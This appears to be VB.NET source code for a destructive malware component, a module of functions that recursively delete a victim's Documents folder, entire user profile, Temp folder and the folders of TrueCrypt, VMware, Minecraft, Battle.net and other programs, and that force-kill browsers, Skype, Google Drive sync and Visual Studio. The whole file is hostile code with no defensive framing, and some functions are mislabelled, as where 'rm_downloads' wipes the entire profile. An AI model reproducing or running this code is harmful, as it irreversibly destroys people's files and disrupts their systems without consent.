Imports System.IO

Module modLib

    Public Function rnd_number(x As Integer, y As Integer) As String
        Dim rn As New Random
        Return rn.Next(x, y)
    End Function

    Public Function RandomString(size As Integer, Optional validchars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz") As String
        If size < 1 Or validchars.Length = 0 Then Return ""
        RandomString = ""
        Randomize()
        For i = 1 To size
            RandomString &= Mid(validchars, Int(Rnd() * validchars.Length) + 1, 1)
        Next
    End Function

    Public Function rm_truecrypt()
        Dim szProgramFilesPath As String
        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
        rm(szProgramFilesPath & "\TrueCrypt\")
        Return Nothing
    End Function

    Public Function rm_fdm()
        Dim szProgramFilesPath As String
        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
        rm(szProgramFilesPath & "\Free Download Manager\")
        Return Nothing
    End Function

    Public Function rm_vmware()
        Dim szProgramFilesPath As String
        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
        rm(szProgramFilesPath & "\VMware\")
        Return Nothing
    End Function

    ' remove entire document directory
    Public Function rm_documents()
        Dim szProgramFilesPath As String
        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal)
        rm(szProgramFilesPath)
        Return Nothing
    End Function

    Public Function rm_downloads()
        Dim szProgramFilesPath As String
        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
        rm(szProgramFilesPath)
        rm("C:\Downloads")
        Return Nothing
    End Function

    Public Function rm_temp()
        Dim szProgramFilesPath As String
        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
        rm(szProgramFilesPath & "\AppData\Local\Temp\")
        Return Nothing
    End Function

    Public Function rm_minecraft()
        Dim szProgramFilesPath As String
        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
        rm(szProgramFilesPath & "\AppData\Roaming\.minecraft\")
        Return Nothing
    End Function

    Public Function rm_battlenet()
        Dim szProgramFilesPath As String
        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
        rm(szProgramFilesPath & "\AppData\Roaming\Battle.net")
        rm(szProgramFilesPath & "\AppData\Local\Battle.net")
        Return Nothing
    End Function

    Public Function rm_quassel()
        Dim szProgramFilesPath As String
        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
        rm(szProgramFilesPath & "\AppData\Roaming\quassel-irc.org")
        rm(szProgramFilesPath & "\AppData\Local\Battle.net")
        Return Nothing
    End Function


    Private Sub rm(path As String)
        If Directory.Exists(path) Then
            'Delete all files from the Directory
            For Each filepath As String In Directory.GetFiles(path)
                File.Delete(filepath)
            Next
            'Delete all child Directories
            For Each dir As String In Directory.GetDirectories(path)
                rm(dir)
            Next
            'Delete a Directory
            Directory.Delete(path)
        End If
    End Sub

    Public Function TerminateProgramList()
        Dim array() As String = {"chrome", "firefox", "googledrivesync.exe", "skype.exe", "devenv.exe"}
        For Each Val As String In array
            kill_proc(Val)
        Next
        Return Nothing
    End Function

    Public Function kill_proc(ProcessName As String)
        For Each p As Process In Process.GetProcesses
            'ListBox1.Items.Add(p.ProcessName.ToString)
            If p.ProcessName = ProcessName Then
                p.Kill()
            End If
        Next
        Return Nothing
    End Function

End Module
